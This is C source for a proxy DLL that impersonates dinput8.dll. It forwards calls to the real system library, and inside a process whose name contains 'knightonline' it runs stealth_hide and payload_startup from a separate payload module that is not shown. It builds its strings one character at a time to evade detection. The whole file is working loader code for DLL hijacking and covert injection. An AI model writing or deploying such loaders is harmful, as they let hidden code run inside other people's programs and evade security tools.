#include <windows.h>
#include <string.h>
#include "../payload/payload.h"

static HMODULE g_realDI = NULL;

static FARPROC pfn_DirectInput8Create;
static FARPROC pfn_DllCanUnloadNow;
static FARPROC pfn_DllGetClassObject;
static FARPROC pfn_DllRegisterServer;
static FARPROC pfn_DllUnregisterServer;

__declspec(naked) void __stdcall p_DirectInput8Create(void)
{ __asm { jmp dword ptr [pfn_DirectInput8Create] } }

__declspec(naked) void __stdcall p_DllCanUnloadNow(void)
{ __asm { jmp dword ptr [pfn_DllCanUnloadNow] } }

__declspec(naked) void __stdcall p_DllGetClassObject(void)
{ __asm { jmp dword ptr [pfn_DllGetClassObject] } }

__declspec(naked) void __stdcall p_DllRegisterServer(void)
{ __asm { jmp dword ptr [pfn_DllRegisterServer] } }

__declspec(naked) void __stdcall p_DllUnregisterServer(void)
{ __asm { jmp dword ptr [pfn_DllUnregisterServer] } }

static BOOL load_real(void)
{
    char sysDir[MAX_PATH];
    char realPath[MAX_PATH];

    GetSystemDirectoryA(sysDir, MAX_PATH);

    char dll[16];
    dll[0]='d'; dll[1]='i'; dll[2]='n'; dll[3]='p'; dll[4]='u'; dll[5]='t';
    dll[6]='8'; dll[7]='.'; dll[8]='d'; dll[9]='l'; dll[10]='l'; dll[11]='\0';

    wsprintfA(realPath, "%s\\%s", sysDir, dll);

    g_realDI = LoadLibraryA(realPath);
    if (!g_realDI) return FALSE;

    pfn_DirectInput8Create = GetProcAddress(g_realDI, "DirectInput8Create");
    pfn_DllCanUnloadNow    = GetProcAddress(g_realDI, "DllCanUnloadNow");
    pfn_DllGetClassObject  = GetProcAddress(g_realDI, "DllGetClassObject");
    pfn_DllRegisterServer  = GetProcAddress(g_realDI, "DllRegisterServer");
    pfn_DllUnregisterServer = GetProcAddress(g_realDI, "DllUnregisterServer");

    return (pfn_DirectInput8Create != NULL);
}

static BOOL is_target_process(void)
{
    char exeName[MAX_PATH];
    GetModuleFileNameA(NULL, exeName, MAX_PATH);
    _strlwr(exeName);
    char t[16];
    t[0]='k'; t[1]='n'; t[2]='i'; t[3]='g'; t[4]='h'; t[5]='t';
    t[6]='o'; t[7]='n'; t[8]='l'; t[9]='i'; t[10]='n'; t[11]='e';
    t[12]='\0';
    return (strstr(exeName, t) != NULL);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        if (!load_real())
            return FALSE;
        if (is_target_process()) {
            stealth_hide(hModule);
            payload_startup(hModule);
        }
        break;

    case DLL_PROCESS_DETACH:
        payload_shutdown();
        if (g_realDI)
            FreeLibrary(g_realDI);
        break;
    }
    return TRUE;
}
